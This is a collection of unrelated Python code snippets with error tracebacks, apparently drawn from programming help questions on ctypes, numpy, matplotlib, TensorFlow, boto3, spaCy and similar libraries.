"def py_fDecodeCallBack ( lPort , pBuffer , lSize , pFrameInfo , lReserved1 , lReserved2 ) : print `` lPort : % r '' % lPort print `` lSize : % r `` % lSize print pFrameInfo print pBuffer print `` pFrame Info : % r `` % pFrameInfo.nWidth return 0 class FRAME_INFO ( Structure ) : _fields_ = [ ( 'nWidth ' , c_long ) , ( 'nHeight ' , c_long ) , ( 'nStamp ' , c_long ) , ( 'nType ' , c_long ) , ( 'nFrameRate ' , c_long ) , ( 'dwFrameNum ' , wintypes.DWORD ) ] FSETDECCALLBACK = WINFUNCTYPE ( c_bool , c_long , POINTER ( wintypes.BYTE ) , c_long , POINTER ( FRAME_INFO ) , c_long , c_long ) fSetDecCallBack = FSETDECCALLBACK ( py_fDecodeCallBack ) Traceback ( most recent call last ) : File `` _ctypes/callbacks.c '' , line 313 , in 'calling callback function'lPort : 0lSize : 1382400 < mytypes.LP_FRAME_INFO object at 0x03109CB0 > < wintypes2.LP_c_byte object at 0x03109D00 > File `` C : \Users\Rex\workspace\iSentry\hcnetsdkhelper.py '' , line 76 , in py_fDecodeCallBack print `` pFrame Info : % r `` % pFrameInfo.nWidthAttributeError : 'LP_FRAME_INFO ' object has no attribute 'nWidth '"
"class Vector : def __init__ ( self , x , y ) : self.x , self.y = x , y def __str__ ( self ) : return ' ( % s , % s ) ' % ( self.x , self.y ) def __add__ ( self , n ) : if isinstance ( n , ( int , long , float ) ) : return Vector ( self.x+n , self.y+n ) elif isinstance ( n , Vector ) : return Vector ( self.x+n.x , self.y+n.y ) a = Vector ( 1,2 ) print ( a + 1 ) # prints ( 2,3 ) a = Vector ( 1,2 ) print ( 1 + a ) # raises TypeError : unsupported operand type ( s ) # for + : 'int ' and 'instance '"
"> > > class Thing ( object ) : # ... > > > Thing.to_json ( ) ' A ' > > > Thing ( ) .to_json ( ) ' B ' class combomethod ( object ) : def __init__ ( self , method ) : self.method = method def __get__ ( self , obj=None , objtype=None ) : @ functools.wraps ( self.method ) def _wrapper ( *args , **kwargs ) : if obj is not None : return self.method ( obj , *args , **kwargs ) else : return self.method ( objtype , *args , **kwargs ) return _wrapper"
"import matplotlib.pyplot as pltfrom mpl_toolkits.mplot3d import Axes3Dfig = plt.figure ( ) ax = Axes3D ( fig ) ax.scatter ( [ 0.2 , 0.5 , 0.8 ] , [ 2.3 , 0.47 , 1 . ] , [ 2.1 , 5.3 , 0.7 ] ) ax.set_xlabel ( ' x ' ) ax.set_ylabel ( ' y ' ) ax.set_zlabel ( ' z ' ) plt.show ( )"
"d = { 'banana':3 , 'orange':5 , 'apple':5 } out : [ ( 'apple ' , 5 ) , ( 'orange ' , 5 ) , ( 'banana ' , 3 ) ] sorted ( d.items ( ) , key=operator.itemgetter ( 1,0 ) , reverse=True ) out : [ ( 'orange ' , 5 ) , ( 'apple ' , 5 ) , ( 'banana ' , 3 ) ]"
"from docopt import docopt '' '' '' Usage : ./convert [ -h | -i | -t | -c ] Options : -h Show this help -i Convert image to vertical scroll box -t Convert text to vertical scroll box -c Convert command list to html '' '' '' def main ( docopt_args ) : ... if __name__ == '__main__ ' : args = docopt ( __doc__ , version='v0.1 ' ) main ( args )"
"import numpy as npimport matplotlib.pyplot as pltfrom random import randintfig = plt.figure ( ) Wells=np.arange ( 0,10,1 ) # number of wells to plotfor i in Wells : samp=randint ( 50,100 ) # number of samples in well dist=0.02 # space between plots left=0.05 # left border right=0.05 # right border base=0.05 # bottom border width= ( ( 1.0- ( left+right ) ) /len ( Wells ) ) # width of subplot height= ( 1.0-base ) / ( 100.0/samp ) # height of subplot # create subplots ax = fig.add_axes ( [ left+ ( i*width ) +dist , 1.0- ( base+height ) , width-dist , height ] ) # left , bottom , width , height of subplot # random data x=np.random.random_integers ( 100 , size= ( samp ) ) y=np.arange ( 0 , len ( x ) ,1 ) # plot ax.plot ( x , y , alpha=0.5 ) # zone area of plot zone=samp/2.5 ax.axhspan ( 15 , zone , color= ' k ' , alpha=0.2 ) # axis ' h ' horizontal span # format ax.set_ylim ( 0 , max ( y ) ) ax.set_xlim ( 0 , max ( x ) ) ax.tick_params ( axis='both ' , label1On=False , label2On=False ) plt.show ( )"
"> > A = numpy.array ( [ 1,2,3,4,5 ] ) > > A > 3array ( [ False , False , False , True , True ] ) > > A = numpy.array ( [ 1,2,3,4,5 ] ) > > crit = [ 1,3,5 ] > > A in crit > > [ a in crit for a in A ] array ( [ True , False , True , False , True ] )"
"# -*- coding : utf-8 -*- '' '' '' Testing exception handling in PySide slots . `` `` '' from __future__ import unicode_literals , print_function , divisionimport loggingimport sysfrom PySide import QtCorefrom PySide import QtGuilogging.basicConfig ( level=logging.DEBUG ) logger = logging.getLogger ( __name__ ) class ExceptionTestWidget ( QtGui.QWidget ) : raise_exception = QtCore.Signal ( ) def __init__ ( self , *args , **kwargs ) : super ( ExceptionTestWidget , self ) .__init__ ( *args , **kwargs ) self.raise_exception.connect ( self.slot_raise_exception ) layout = QtGui.QVBoxLayout ( ) self.setLayout ( layout ) # button to invoke handler that handles raised exception as expected btn_raise_without_signal = QtGui.QPushButton ( `` Raise without signal '' ) btn_raise_without_signal.clicked.connect ( self.on_raise_without_signal ) layout.addWidget ( btn_raise_without_signal ) # button to invoke handler that handles raised exception via signal unexpectedly btn_raise_with_signal = QtGui.QPushButton ( `` Raise with signal '' ) btn_raise_with_signal.clicked.connect ( self.on_raise_with_signal ) layout.addWidget ( btn_raise_with_signal ) def slot_raise_exception ( self ) : raise ValueError ( `` ValueError on purpose '' ) def on_raise_without_signal ( self ) : `` '' '' Call function that raises exception directly . '' '' '' try : self.slot_raise_exception ( ) except ValueError as exception_instance : logger.error ( `` { } '' .format ( exception_instance ) ) else : logger.info ( `` on_raise_without_signal ( ) executed successfully '' ) def on_raise_with_signal ( self ) : `` '' '' Call slot that raises exception via signal . '' '' '' try : self.raise_exception.emit ( ) except ValueError as exception_instance : logger.error ( `` { } '' .format ( exception_instance ) ) else : logger.info ( `` on_raise_with_signal ( ) executed successfully '' ) if ( __name__ == `` __main__ '' ) : application = QtGui.QApplication ( sys.argv ) widget = ExceptionTestWidget ( ) widget.show ( ) sys.exit ( application.exec_ ( ) )"
a = object ( ) a.b = 3 class c ( object ) : passa = c ( ) a.b = 3
"class Group ( db.Model ) : name = db.StringProperty ( required=True ) creator = db.ReferenceProperty ( User ) class GroupMember ( db.Model ) : group = db.ReferenceProperty ( Group ) user = db.ReferenceProperty ( User ) members = models.GroupMember.all ( ) .filter ( 'group.name = ' , group_name )"
"import numpyimport mathfrom ortools.constraint_solver import pywrapcpfrom ortools.constraint_solver import routing_enums_pb2import matplotlib % matplotlib inlinefrom matplotlib import pyplot , pylabpylab.rcParams [ 'figure.figsize ' ] = 20 , 10n_points = 200orders = numpy.random.randn ( n_points , 2 ) coordinates = orders.tolist ( ) class Distance : def __init__ ( self , coords ) : self.coords = coords def distance ( self , x , y ) : return math.sqrt ( ( x [ 0 ] - y [ 0 ] ) ** 2 + ( x [ 1 ] - y [ 1 ] ) ** 2 ) def __call__ ( self , x , y ) : return self.distance ( self.coords [ x ] , self.coords [ y ] ) distance = Distance ( coordinates ) search_parameters = pywrapcp.RoutingModel.DefaultSearchParameters ( ) search_parameters.first_solution_strategy = ( routing_enums_pb2.FirstSolutionStrategy.LOCAL_CHEAPEST_ARC ) search_parameters.local_search_metaheuristic = routing_enums_pb2.LocalSearchMetaheuristic.TABU_SEARCHrouting = pywrapcp.RoutingModel ( len ( coordinates ) , 1 ) routing.SetArcCostEvaluatorOfAllVehicles ( distance ) routing.SetDepot ( 0 ) solver = routing.solver ( ) routing.CloseModel ( ) # the documentation is a bit unclear on whether this is neededassignment = routing.SolveWithParameters ( search_parameters ) nodes = [ ] index = routing.Start ( 0 ) while not routing.IsEnd ( index ) : nodes.append ( routing.IndexToNode ( index ) ) index = assignment.Value ( routing.NextVar ( index ) ) nodes.append ( 0 ) for ( a , b ) in zip ( nodes , nodes [ 1 : ] ) : a , b = coordinates [ a ] , coordinates [ b ] pyplot.plot ( [ a [ 0 ] , b [ 0 ] ] , [ a [ 1 ] , b [ 1 ] ] , ' r ' )"
"import loggingimport yamlwith open ( 'logging.yaml ' , ' r ' ) as f : logConfig = yaml.safe_load ( f.read ( ) ) logging.config.dictConfig ( logConfig ) version : 1formatters : simple : format : `` % ( asctime ) s - % ( name ) s - % ( levelname ) s - % ( message ) s '' handlers : console : class : logging.StreamHandler level : DEBUG formatter : simpleloggers : my_module : level : ERRORroot : level : INFO handlers : [ console ] import loggingimport yamllogConfig = logging.get_current_config_as_a_dictionary ( ) with open ( 'logging.yaml ' , ' w ' ) as f : f.write ( yaml.dump ( logConfig ) )"
"def g_user ( ) : while True : yield read_user_input ( ) def g_socket ( ) : while True : yield read_socket_input ( ) def g_combined ( gu , gs ) : # should read user or socket input , whichever is available while True : sel = select ( gu , gs ) if sel.contains ( gu ) : yield gu.next ( ) if sel.contains ( gs ) : yield gs.next ( ) gc = g_combined ( g_user ( ) , g_socket ( ) )"
"import numpy as npimport nibabelimport tensorflow as tffrom tensorflow.keras.layers import Conv3D , MaxPooling3Dfrom tensorflow.keras.layers import Densefrom tensorflow.keras.layers import Dropoutfrom tensorflow.keras.layers import Flattenfrom tensorflow.keras import Modelimport osimport random '' '' '' Configure GPUs to prevent OOM errors '' '' '' gpus = tf.config.experimental.list_physical_devices ( 'GPU ' ) for gpu in gpus : tf.config.experimental.set_memory_growth ( gpu , True ) '' '' '' Retrieve file names '' '' '' ad_files = os.listdir ( `` /home/asdf/OASIS/3D/ad/ '' ) cn_files = os.listdir ( `` /home/asdf/OASIS/3D/cn/ '' ) sub_id_ad = [ ] sub_id_cn = [ ] '' '' '' OASIS AD : 178 Subjects , 278 3T MRIs '' '' '' '' '' '' OASIS CN : 588 Subjects , 1640 3T MRIs '' '' '' '' '' '' Down-sampling CN to 278 MRIs '' '' '' random.Random ( 129 ) .shuffle ( ad_files ) random.Random ( 129 ) .shuffle ( cn_files ) '' '' '' Split files for training '' '' '' ad_train = ad_files [ 0:276 ] cn_train = cn_files [ 0:276 ] '' '' '' Shuffle Train data and Train labels '' '' '' train = ad_train + cn_trainlabels = np.concatenate ( ( np.ones ( len ( ad_train ) ) , np.zeros ( len ( cn_train ) ) ) , axis=None ) random.Random ( 129 ) .shuffle ( train ) random.Random ( 129 ) .shuffle ( labels ) print ( len ( train ) ) print ( len ( labels ) ) '' '' '' Change working directory to OASIS/3D/all/ '' '' '' os.chdir ( `` /home/asdf/OASIS/3D/all/ '' ) '' '' '' Create tf data pipeline '' '' '' def load_image ( file , label ) : nifti = np.asarray ( nibabel.load ( file.numpy ( ) .decode ( 'utf-8 ' ) ) .get_fdata ( ) ) xs , ys , zs = np.where ( nifti ! = 0 ) nifti = nifti [ min ( xs ) : max ( xs ) + 1 , min ( ys ) : max ( ys ) + 1 , min ( zs ) : max ( zs ) + 1 ] nifti = nifti [ 0:100 , 0:100 , 0:100 ] nifti = np.reshape ( nifti , ( 100 , 100 , 100 , 1 ) ) nifti = tf.convert_to_tensor ( nifti , np.float64 ) return nifti , label @ tf.autograph.experimental.do_not_convertdef load_image_wrapper ( file , labels ) : return tf.py_function ( load_image , [ file , labels ] , [ tf.float64 , tf.float64 ] ) dataset = tf.data.Dataset.from_tensor_slices ( ( train , labels ) ) dataset = dataset.shuffle ( 6 , 129 ) dataset = dataset.repeat ( 50 ) dataset = dataset.map ( load_image_wrapper , num_parallel_calls=6 ) dataset = dataset.batch ( 6 ) dataset = dataset.prefetch ( buffer_size=1 ) iterator = iter ( dataset ) batch_images , batch_labels = iterator.get_next ( ) # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # with tf.device ( `` /cpu:0 '' ) : with tf.device ( `` /gpu:0 '' ) : model = tf.keras.Sequential ( ) model.add ( Conv3D ( 64 , input_shape= ( 100 , 100 , 100 , 1 ) , data_format='channels_last ' , kernel_size= ( 7 , 7 , 7 ) , strides= ( 2 , 2 , 2 ) , padding='valid ' , activation='relu ' ) ) with tf.device ( `` /gpu:1 '' ) : model.add ( Conv3D ( 64 , kernel_size= ( 3 , 3 , 3 ) , padding='valid ' , activation='relu ' ) ) with tf.device ( `` /gpu:2 '' ) : model.add ( Conv3D ( 128 , kernel_size= ( 3 , 3 , 3 ) , padding='valid ' , activation='relu ' ) ) model.add ( MaxPooling3D ( pool_size= ( 2 , 2 , 2 ) , padding='valid ' ) ) model.add ( Flatten ( ) ) model.add ( Dense ( 256 , activation='relu ' ) ) model.add ( Dense ( 1 , activation='sigmoid ' ) ) model.compile ( loss=tf.keras.losses.binary_crossentropy , optimizer=tf.keras.optimizers.Adagrad ( 0.01 ) , metrics= [ 'accuracy ' ] ) # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # model.fit ( batch_images , batch_labels , steps_per_epoch=92 , epochs=50 ) Epoch 3/5092/6 [ ============================================================================================================================================================================================================================================================================================================================================================================================================================================================================ ] - 3s 36ms/sample - loss : 0.1902 - accuracy : 0.8043Epoch 4/505/6 [ ======================== > ... .. ] - ETA : 0s - loss : 0.2216 - accuracy : 0.80002020-03-06 15:18:17.804126 : W tensorflow/core/common_runtime/base_collective_executor.cc:217 ] BaseCollectiveExecutor : :StartAbort Out of range : End of sequence [ [ { { node IteratorGetNext } } ] ] [ [ BiasAddGrad_3/_54 ] ] 2020-03-06 15:18:17.804137 : W tensorflow/core/common_runtime/base_collective_executor.cc:217 ] BaseCollectiveExecutor : :StartAbort Out of range : End of sequence [ [ { { node IteratorGetNext } } ] ] [ [ sequential/conv3d_3/Conv3D/ReadVariableOp/_21 ] ] 2020-03-06 15:18:17.804140 : W tensorflow/core/common_runtime/base_collective_executor.cc:217 ] BaseCollectiveExecutor : :StartAbort Out of range : End of sequence [ [ { { node IteratorGetNext } } ] ] [ [ Conv3DBackpropFilterV2_3/_68 ] ] 2020-03-06 15:18:17.804263 : W tensorflow/core/common_runtime/base_collective_executor.cc:217 ] BaseCollectiveExecutor : :StartAbort Out of range : End of sequence [ [ { { node IteratorGetNext } } ] ] [ [ sequential/dense/MatMul/ReadVariableOp/_30 ] ] 2020-03-06 15:18:17.804364 : W tensorflow/core/common_runtime/base_collective_executor.cc:217 ] BaseCollectiveExecutor : :StartAbort Out of range : End of sequence [ [ { { node IteratorGetNext } } ] ] [ [ BiasAddGrad_5/_62 ] ] 2020-03-06 15:18:17.804561 : W tensorflow/core/common_runtime/base_collective_executor.cc:217 ] BaseCollectiveExecutor : :StartAbort Out of range : End of sequence [ [ { { node IteratorGetNext } } ] ] WARNING : tensorflow : Your input ran out of data ; interrupting training . Make sure that your dataset or generator can generate at least ` steps_per_epoch * epochs ` batches ( in this case , 4600 batches ) . You may need to use the repeat ( ) f24/6 [ ======================================================================================================================== ] - 1s 36ms/sample - loss : 0.1673 - accuracy : 0.8750Traceback ( most recent call last ) : File `` python_scripts/gpu_farm/tf_data_generator/3D_tf_data_generator.py '' , line 181 , in < module > evaluation_ad = model.evaluate ( ad_test , ad_test_labels , verbose=0 ) File `` /usr/local/lib/python3.6/dist-packages/tensorflow_core/python/keras/engine/training.py '' , line 930 , in evaluate use_multiprocessing=use_multiprocessing ) File `` /usr/local/lib/python3.6/dist-packages/tensorflow_core/python/keras/engine/training_v2.py '' , line 490 , in evaluate use_multiprocessing=use_multiprocessing , **kwargs ) File `` /usr/local/lib/python3.6/dist-packages/tensorflow_core/python/keras/engine/training_v2.py '' , line 426 , in _model_iteration use_multiprocessing=use_multiprocessing ) File `` /usr/local/lib/python3.6/dist-packages/tensorflow_core/python/keras/engine/training_v2.py '' , line 646 , in _process_inputs x , y , sample_weight=sample_weights ) File `` /usr/local/lib/python3.6/dist-packages/tensorflow_core/python/keras/engine/training.py '' , line 2383 , in _standardize_user_data batch_size=batch_size ) File `` /usr/local/lib/python3.6/dist-packages/tensorflow_core/python/keras/engine/training.py '' , line 2489 , in _standardize_tensors y , self._feed_loss_fns , feed_output_shapes ) File `` /usr/local/lib/python3.6/dist-packages/tensorflow_core/python/keras/engine/training_utils.py '' , line 810 , in check_loss_and_target_compatibility ' while using as loss ` ' + loss_name + ' ` . 'ValueError : A target array with shape ( 5 , 2 ) was passed for an output of shape ( None , 1 ) while using as loss ` binary_crossentropy ` . This loss expects targets to have the same shape as the output ."
html = < a > < b > Text < /b > Text2 < /a > [ x.extract ( ) for x in html.findAll ( .//b ) ] html = < a > Text2 < /a > [ bad.getparent ( ) .remove ( bad ) for bad in html.xpath ( `` .//b '' ) ] html = < a > < /a > for bad in raw.xpath ( xpath_search ) : bad.text = ``
"class MiddlewareSkipHTTPS ( object ) : def process_response ( self , request , response , spider ) : if ( response.url.find ( `` https '' ) > -1 ) : raise IgnoreRequest ( ) else : return response"
"[ { key1 : value } , { key2 : value } , { key3 : value } , ... ] my_list = [ 3423 , 77813 , 12 , 153 , 1899 ] [ { 3423 : [ 'dog ' , 'cat ' ] } , { 77813 : [ 'dog ' , 'cat ' ] } , { 12 : [ 'dog ' , 'cat ' ] } , { 153 : [ 'dog ' , 'cat ' ] } , { 1899 : [ 'dog ' , 'cat ' ] } ]"
@ app.route ( '/ ' ) def index ( ) : return render_template ( 'index.html ' )
"d = { ' x ' : 0.010000000000000231 } print d # outputs { ' x ' : 0.010000000000000231 } print d [ ' x ' ] # outputs 0.01 print ' { : .18f } '.format ( d [ ' x ' ] ) # outputs 0.010000000000000231 print ' x = { } '.format ( d [ ' x ' ] ) print ' x = ' , d [ ' x ' ]"
"@ app.task ( name='wololo.tasks.upgrade_building ' ) def upgrade_building ( user_id ) : os.environ [ 'DJANGO_SETTINGS_MODULE ' ] = 'DjangoFirebaseProject.settings ' from channels.layers import get_channel_layer channel_layer = get_channel_layer ( ) print ( channel_layer , `` wololo '' ) async_to_sync ( channel_layer.send ) ( 'chat ' , { 'type ' : 'hello.message ' , 'message ' : 'hadiInsss ' , } ) return True from channels.generic.websocket import WebsocketConsumerimport jsonfrom asgiref.sync import async_to_syncclass ChatConsumer ( WebsocketConsumer ) : def connect ( self ) : async_to_sync ( self.channel_layer.group_add ) ( `` chat '' , self.channel_name ) self.accept ( ) def disconnect ( self , close_code ) : async_to_sync ( self.channel_layer.group_discard ) ( `` chat '' , self.channel_name ) def hello_message ( self , event ) : print ( `` U MUST SEE THAT MSG '' ) # Send a message down to the client self.send ( text_data=json.dumps ( event [ 'message ' ] ) )"
"start = timer ( ) pd.read_csv ( '10k_records.csv ' , parse_dates= [ 'date ' ] ) end = timer ( ) print ( end - start ) def parseDate ( t ) : if type ( t ) is str : st = str ( t ) try : return datetime.datetime ( int ( st [ :4 ] ) , int ( st [ 5:7 ] ) , int ( st [ 8:10 ] ) , int ( st [ 11:13 ] ) , int ( st [ 14:16 ] ) , int ( st [ 17:19 ] ) ) except : return None return datetime.datetime ( 0,0,0,0,0,0 ) pd.read_csv ( '10k_records.csv ' , parse_dates= [ 'date ' ] , date_parser=parseDate )"
+ for src in cpfs.c log.c popcnt.c ssse3_popcount.c blkcache.c context.c types.c device.c++ my_mktemp blkcache.c.o+++ mktemp -t blkcache.c.o.2160.XXX++ p=/tmp/blkcache.c.o.2160.IKA++ test 0 -eq 0++ echo /tmp/blkcache.c.o.2160.IKA+ obj=/tmp/blkcache.c.o.2160.IKA
"class MySurface : def __init__ ( api_surface ) : self.api_surface = api_surface @ property def width ( self ) : return self.api_surface.width @ width.setter def width ( self , value ) : self.api_surface.width = value @ property def height ( self ) : return self.api_surface.height @ height.setter def height ( self , value ) : self.api_surface.height = value"
"`` This is a sentence . # contains symbol and whitespace This is a sentence . # No symbols or whitespace for ch in [ '\ '' ' , ' [ ' , ' ] ' , '* ' , ' _ ' , '- ' ] : if ch in sen1 : sen1 = sen1.replace ( ch , '' '' )"
ID DATE VALUE1 31-01-2006 51 28-02-2006 51 31-05-2006 101 30-06-2006 112 31-01-2006 52 31-02-2006 52 31-03-2006 52 31-04-2006 5 ID DATE VALUE1 31-01-2006 51 28-02-2006 51 31-03-2006 NA1 30-04-2006 NA1 31-05-2006 101 30-06-2006 112 31-01-2006 52 31-02-2006 52 31-03-2006 52 31-04-2006 5
"from boto3.session import Sessionsession = Session ( aws_access_key_id= < ACCESS_KEY > , aws_secret_access_key= < SECRET_KEY > , aws_session_token= < TOKEN > ) s3_resource = session.resource ( 's3 ' ) for bucket in s3_resource.buckets.all ( ) : for obj in bucket.objects.all ( ) : key = s3_resource.Object ( bucket.name , obj.key ) # Do some stuff with the key ... for obj in bucket.objects.all ( ) : File `` /usr/local/lib/python2.7/site-packages/boto3/resources/collection.py '' , line 82 , in __iter__for page in self.pages ( ) : File `` /usr/local/lib/python2.7/site-packages/boto3/resources/collection.py '' , line 165 , in pagesfor page in pages : File `` /usr/lib/python2.7/dist-packages/botocore/paginate.py '' , line 85 , in __iter__response = self._make_request ( current_kwargs ) File `` /usr/lib/python2.7/dist-packages/botocore/paginate.py '' , line 157 , in _make_requestreturn self._method ( **current_kwargs ) File `` /usr/lib/python2.7/dist-packages/botocore/client.py '' , line 310 , in _api_callreturn self._make_api_call ( operation_name , kwargs ) File `` /usr/lib/python2.7/dist-packages/botocore/client.py '' , line 395 , in _make_api_callraise ClientError ( parsed_response , operation_name ) botocore.exceptions.ClientError : An error occurred ( PermanentRedirect ) when calling the ListObjects operation : The bucket you are attempting to access must be addressed using the specified endpoint . Please send all future requests to this endpoint . from boto3.session import Sessionsession = Session ( aws_access_key_id= < ACCESS_KEY > , aws_secret_access_key= < SECRET_KEY > , aws_session_token= < TOKEN > ) s3_resource = session.resource ( 's3 ' ) # First get all the bucket namesbucket_names = [ bucket.name for bucket in s3_resource.buckets.all ( ) ] for bucket_name in bucket_names : # Check each name for a `` . '' and use a different resource if needed if `` . '' in bucket_name : region = session.client ( 's3 ' ) .get_bucket_location ( Bucket=bucket_name ) [ 'LocationConstraint ' ] resource = session.resource ( 's3 ' , region_name=region ) else : resource = s3_resource bucket = resource.Bucket ( bucket_name ) # Continue as usual using this resource for obj in bucket.objects.all ( ) : key = resource.Object ( bucket.name , obj.key ) # Do some stuff with the key ..."
"df2 = df.iloc [ : , : -5 ]"
"from pony.orm import *db = Database ( ) class Names ( db.Entity ) : first_name = Optional ( str ) last_name = Optional ( str ) family = [ [ `` Peter '' , `` Mueller '' ] , [ `` Paul '' , `` Meyer '' ] , ... ] @ db_sessiondef populate_names ( name_list ) for name in name_list : db.insert ( `` Names '' , first_name=name [ 0 ] , last_name=name [ 1 ] ) if __name__ == `` __main__ '' : db.bind ( provider='postgres ' , user= '' , password= '' , host= '' , database= '' ) db.generate_mappings ( create_tables=True ) populate_names ( family )"
"import spacy.lang.en nlp = spacy.lang.en.English ( ) text = ' I am trying to extract January as efficient as possible . But what is the best solution ? ' import spacy.tokensNORM_EXCEPTIONS = { 'jan ' : 'MONTH ' , 'january ' : 'MONTH ' } spacy.tokens.Token.set_extension ( 'norm ' , getter=lambda t : NORM_EXCEPTIONS.get ( t.text.lower ( ) , t.norm_ ) ) def time_this ( ) : doc = nlp ( text ) assert [ t for t in doc if t._.norm == 'MONTH ' ] == [ doc [ 5 ] ] % timeit time_this ( ) import spacy.pipelineruler = spacy.pipeline.EntityRuler ( nlp ) ruler.phrase_matcher = spacy.matcher.PhraseMatcher ( nlp.vocab , attr= '' LOWER '' ) ruler.add_patterns ( [ { 'label ' : 'MONTH ' , 'pattern ' : 'jan ' } , { 'label ' : 'MONTH ' , 'pattern ' : 'january ' } ] ) nlp.add_pipe ( ruler ) def time_this ( ) : doc = nlp ( text ) assert [ t for t in doc.ents ] == [ doc [ 5:6 ] ] % timeit time_this ( ) import spacy.pipelineruler = spacy.pipeline.EntityRuler ( nlp ) ruler.add_patterns ( [ { 'label ' : 'MONTH ' , 'pattern ' : [ { 'lower ' : { 'IN ' : [ 'jan ' , 'january ' ] } } ] } ] ) nlp.add_pipe ( ruler ) def time_this ( ) : doc = nlp ( text ) assert [ t for t in doc.ents ] == [ doc [ 5:6 ] ] % timeit time_this ( ) import spacy.matcherphrase_matcher = spacy.matcher.PhraseMatcher ( nlp.vocab , attr= '' LOWER '' ) phrase_matcher.add ( 'MONTH ' , None , nlp ( 'jan ' ) , nlp ( 'january ' ) ) def time_this ( ) : doc = nlp ( text ) matches = [ m for m in filter ( lambda x : x [ 0 ] == doc.vocab.strings [ 'MONTH ' ] , phrase_matcher ( doc ) ) ] assert [ doc [ m [ 1 ] : m [ 2 ] ] for m in matches ] == [ doc [ 5:6 ] ] % timeit time_this ( ) import spacy.matchermatcher = spacy.matcher.Matcher ( nlp.vocab ) matcher.add ( 'MONTH ' , None , [ { 'lower ' : { 'IN ' : [ 'jan ' , 'january ' ] } } ] ) def time_this ( ) : doc = nlp ( text ) matches = [ m for m in filter ( lambda x : x [ 0 ] == doc.vocab.strings [ 'MONTH ' ] , matcher ( doc ) ) ] assert [ doc [ m [ 1 ] : m [ 2 ] ] for m in matches ] == [ doc [ 5:6 ] ] % timeit time_this ( )"
/tmp/test-9aa440.o : In function 'main ' : test.bc : ( .text+0x67 ) : undefined reference to 'numba_gil_ensure'test.bc : ( .text+0x79 ) : undefined reference to 'numba_unpickle'test.bc : ( .text+0x84 ) : undefined reference to 'PyObject_Str'test.bc : ( .text+0x8f ) : undefined reference to 'PyString_AsString'test.bc : ( .text+0xa1 ) : undefined reference to 'PySys_WriteStdout'test.bc : ( .text+0xa9 ) : undefined reference to 'Py_DecRef'test.bc : ( .text+0xb1 ) : undefined reference to 'Py_DecRef'test.bc : ( .text+0xbd ) : undefined reference to 'PySys_WriteStdout'test.bc : ( .text+0xc5 ) : undefined reference to 'numba_gil_release'test.bc : ( .text+0xff ) : undefined reference to 'numba_gil_ensure'test.bc : ( .text+0x10b ) : undefined reference to 'PySys_WriteStdout'test.bc : ( .text+0x113 ) : undefined reference to 'numba_gil_release'clang : error : linker command failed with exit code 1 ( use -v to see invocation ) /tmp/main-5e59bd.o : In function ‘ main : :sum : :h514304ffa40dd7c3 ’ : main.bc : ( .text+0xf ) : undefined reference to ‘ core : :panicking : :panic : :h2596388ccef1871c ’ /tmp/main-5e59bd.o : In function ‘ main ’ : main.bc : ( .text+0x53 ) : undefined reference to ‘ std : :rt : :lang_start : :h65647f6e36cffdae ’ clang : error : linker command failed with exit code 1 ( use -v to see invocation )
"e.g : A , B = input dataframesC = final dataframeI want C [ i ] [ j ] = A [ i ] [ j ] *B [ i ] [ j ] for i=1..N and j=1..M"
"a= [ [ 1,2,3,4,5,6 ] , [ 7,8,9,10,11,12 ] ] b= [ [ 5 , 9 , 25 , 31 , 33 , 36 ] , [ 7,8,9,10,11,12 ] , [ 10 , 13 , 22 , 24 , 33 , 44 ] ] for each in a : for item in b : if set ( each ) .issubset ( item ) a.remove ( each ) print ( a ) [ [ 1 , 2 , 3 , 4 , 5 , 6 ] ]"
"lstm_out = lstm_out.contiguous ( ) .view ( -1 , self.hidden_dim )"
"test_image = [ ndimage.imread ( `` test_image.png '' , mode= '' RGB '' ) .astype ( float ) /255 ] imTensor = np.asarray ( test_image ) def load_graph ( model_file ) : graph = tf.Graph ( ) graph_def = tf.GraphDef ( ) with open ( model_file , `` rb '' ) as f : graph_def.ParseFromString ( f.read ( ) ) with graph.as_default ( ) : tf.import_graph_def ( graph_def ) return graphgraph=load_graph ( `` model.pb '' ) with tf.Session ( graph=graph ) as sess : input_operation = graph.get_operation_by_name ( `` import/conv2d_1_input '' ) output_operation = graph.get_operation_by_name ( `` import/output_node0 '' ) results = sess.run ( output_operation.outputs [ 0 ] , { input_operation.outputs [ 0 ] : imTensor } ) Bitmap bitmap ; try { InputStream stream = getAssets ( ) .open ( `` test_image.png '' ) ; bitmap = BitmapFactory.decodeStream ( stream ) ; } catch ( IOException e ) { e.printStackTrace ( ) ; } inferenceInterface = new TensorFlowInferenceInterface ( context.getAssets ( ) , `` model.pb '' ) ; int [ ] intValues = new int [ 129*45 ] ; float [ ] floatValues = new float [ 129*45*3 ] ; String outputName = `` output_node0 '' ; String [ ] outputNodes = new String [ ] { outputName } ; float [ ] outputs = new float [ 4*36 ] ; bitmap.getPixels ( intValues , 0 , bitmap.getWidth ( ) , 0 , 0 , bitmap.getWidth ( ) , bitmap.getHeight ( ) ) ; for ( int i = 0 ; i < intValues.length ; ++i ) { final int val = intValues [ i ] ; floatValues [ i * 3 + 0 ] = ( ( val > > 16 ) & 0xFF ) / 255 ; floatValues [ i * 3 + 1 ] = ( ( val > > 8 ) & 0xFF ) / 255 ; floatValues [ i * 3 + 2 ] = ( val & 0xFF ) / 255 ; } inferenceInterface.feed ( `` conv2d_1_input '' , floatValues , 1 , 45 , 129 , 3 ) ; inferenceInterface.run ( outputNodes , false ) ; inferenceInterface.fetch ( outputName , outputs ) ;"
"> > > a = arange ( 12 ) .reshape ( 3,4 ) > > > b1 = array ( [ False , True , True ] ) # first dim selection > > > b2 = array ( [ True , False , True , False ] ) # second dim selection > > > > > > a [ b1 , b2 ] # a weird thing to doarray ( [ 4 , 10 ] )"
"# Point with radius 2 ( approx . ) from plotly.offline import plotimport plotly.graph_objs as gotrace = go.Scatter ( x= [ 4 ] , y= [ 4 ] , mode='markers ' , marker= { 'size ' : 260 , 'sizeref ' : 1 } ) # ? ? ? layout = dict ( yaxis=dict ( range= [ 0 , 10 ] ) , xaxis=dict ( range= [ 0 , 10 ] ) ) fig = dict ( data= [ trace ] , layout=layout ) plot ( fig , image_height=1000 , image_width=1000 )"
[ expensive_function ( x ) for x in generator where expensive_function ( x ) < 5 ] [ y in [ expensive_function ( x ) for x in generator where expensive_function ( x ) ] where y < 5 ]
